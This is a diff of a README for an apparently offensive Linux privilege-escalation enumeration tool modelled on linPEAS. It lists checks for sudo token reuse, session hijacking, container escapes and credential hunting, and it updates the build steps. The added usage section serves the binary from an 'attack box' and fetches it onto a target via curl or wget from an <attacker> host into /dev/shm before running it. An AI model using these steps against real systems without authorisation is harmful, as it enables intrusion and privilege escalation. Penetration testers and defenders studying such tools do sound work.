@@ -18,15 +18,15 @@ linPEAS is the standard for Linux privesc enumeration, but it's a ~35,000 line B
 |---|--------|---------------|
 | 1 | System Information | Hostname, identity, kernel version, interesting groups, env vars, PATH hijacking, kernel CVEs (DirtyCow, Dirty Pipe, eBPF), mount option analysis (nosuid/noexec/nodev on key paths), unmounted fstab entries, fstab credential detection |
 | 2 | SUID / SGID Binaries | Filesystem scan for SUID/SGID, GTFOBins cross-reference, owner UID filtering, writable SUID + SGID binary detection, unusual locations, nosuid mount cross-reference (downgrades SUID on nosuid mounts), squashfs mount filtering (snap/AppImage), default SUID demotion (su/sudo/mount/etc. demoted to med), SGID group-aware escalation context (interesting group cross-reference) |
-| 3 | Sudo Rights | `sudo -l` analysis, `/etc/sudoers` + `/etc/sudoers.d/` enumeration, NOPASSWD entries, GTFOBins in sudo rules, env_keep dangerous variables (LD_PRELOAD, LD_LIBRARY_PATH, BASH_ENV, ENV, PATH), `!env_reset`, sudo version CVEs (Baron Samedit, CVE-2019-14287), pivot target directory analysis (runas user owned dirs + root ownership mismatch detection) |
+| 3 | Sudo Rights | `sudo -l` analysis, `/etc/sudoers` + `/etc/sudoers.d/` enumeration, NOPASSWD entries, GTFOBins in sudo rules, env_keep dangerous variables (LD_PRELOAD, LD_LIBRARY_PATH, BASH_ENV, ENV, PATH), `!env_reset`, sudo version CVEs (Baron Samedit, CVE-2019-14287), pivot target directory analysis (runas user owned dirs + root ownership mismatch detection), doas.conf enumeration (nopass/keepenv/persist, identity-filtered), sudo token reuse detection (ptrace_scope + gdb + sibling shells combo assessment) |
 | 4 | Credential Hunting | History files (deduplicated with repeat counts), config file credential patterns (with false positive filtering: sentinel values, .NET assembly metadata, ImageMagick templates, file size cap 256KB, line length cap 500 chars), JS/JSON scanning limited to web deploy dirs (/var/www, /srv, /opt), /etc/shadow readability, /etc/passwd hashes, SSH keys (ownership-aware severity: own keys info, others' keys critical), .netrc, cloud credentials |
-| 5 | Writable Files & Dirs | High-value writable files (/etc/passwd, /etc/shadow, /etc/sudoers, /etc/ld.so.preload, etc.), ld.so.conf recursive library path writability (include dirs, conf files, library dirs, ld.so.preload entries), world-writable directories |
+| 5 | Writable Files & Dirs | High-value writable files (/etc/passwd, /etc/shadow, /etc/sudoers, /etc/ld.so.preload, etc.), ld.so.conf recursive library path writability (include dirs, conf files, library dirs, ld.so.preload entries), /etc/profile.d/ writable script detection, world-writable directories |
 | 6 | Network Information | Interfaces, routes, listening ports (flags databases, Docker API, admin panels, K8s, lateral movement targets), /etc/hosts, ARP, connections, forwarding |
 | 7 | Processes, Cron & Timers | Root processes with writable binaries, crontab analysis, cron wildcard injection (tar, chown, chmod), cron target binary writability (/dev/null filtered, directory-type filtered), systemd timers |
 | 8 | File Capabilities | `getcap` scan with dangerous capability flagging (21 caps including cap_setuid, cap_sys_admin, cap_bpf, etc.), `=ep` full capability set detection, cap+binary combo detection (43 entries across 11 caps), process capability sets, `/proc/[pid]/status` enumeration for non-zero CapEff/CapAmb across all processes (native hex decoding, zero capsh spawns), noise filtering for Chromium/Electron sandbox cap_sys_admin, SUID helpers, known daemon expected caps |
 | 9 | NFS Shares | /etc/exports analysis (no_root_squash detection), showmount enumeration, active NFS mounts |
 | 10 | Container / Docker | Docker/LXC/Kubernetes detection, Docker socket access, docker/lxd/lxc group membership, container escape checks (privileged mode, host mounts, procfs/sysfs writable escape surfaces, seccomp/NoNewPrivs) |
-| 11 | Installed Software | Compilers, interpreters, transfer tools, package counts, web servers, known vulnerable software (screen, pkexec PwnKit, Exim) |
+| 11 | Installed Software | Compilers, interpreters, transfer tools, package counts, web servers, known vulnerable software (screen, pkexec PwnKit, Exim), screen/tmux session hijacking (other users' attachable sockets, root session = critical) |
 | 12 | Users & Groups | UID 0 backdoor user detection (root filtered), interactive shell users, non-empty groups, login history, readable home directories, SSH file enumeration (own keys demoted) |
 | 13 | Services | Running/enabled services, writable systemd unit files, writable init.d scripts |
 | 14 | Interesting Files | Sensitive config files, backups, readable sensitive files, SUID outside standard paths (chrome-sandbox filtered), credential patterns in logs, recently modified files |
@@ -34,20 +34,23 @@ linPEAS is the standard for Linux privesc enumeration, but it's a ~35,000 line B
 
 ## Build
 
-Requires [Crystal](https://crystal-lang.org/install/) 1.19+ for native builds. Docker builds use the official musl image.
+Requires [Crystal](https://crystal-lang.org/install/) 1.19+.
 
 ```bash
+# Static x86_64 binary (recommended — no Docker required)
+make x86_64-native
+
+# Strip symbols (~30-40% size reduction)
+make strip-native
+
 # Native build (dynamic, for testing)
 make local
 
-# Static x86_64 binary via Docker
+# Static x86_64 binary via Docker (alternative)
 make x86_64
 
 # Static arm64 binary via Docker + QEMU
 make arm64
-
-# Both architectures
-make all
 
 # Syntax/type check only (no binary output)
 make check
@@ -57,6 +60,7 @@ make check
 
 | Target | Requires |
 |--------|----------|
+| `make x86_64-native` | Crystal + musl-gcc (`apt install musl-tools`) |
 | `make local` | Crystal installed natively |
 | `make x86_64` | Docker + `crystallang/crystal:latest-musl` |
 | `make arm64` | Docker + QEMU binfmt (`sudo apt install qemu-user-static binfmt-support`) |
@@ -66,8 +70,13 @@ Output binaries are placed in `dist/`.
 ## Usage
 
 ```bash
-# Drop to target
-scp dist/linaudit_x86_64 user@target:/dev/shm/linaudit
+# Serve from attack box
+python3 -m http.server 8080 -d dist/
+
+# Drop to target (pick one)
+curl http://<attacker>:8080/linaudit_x86_64_native -o /dev/shm/linaudit
+wget http://<attacker>:8080/linaudit_x86_64_native -O /dev/shm/linaudit
+scp dist/linaudit_x86_64_native user@target:/dev/shm/linaudit
 
 # Run
 chmod +x /dev/shm/linaudit && /dev/shm/linaudit
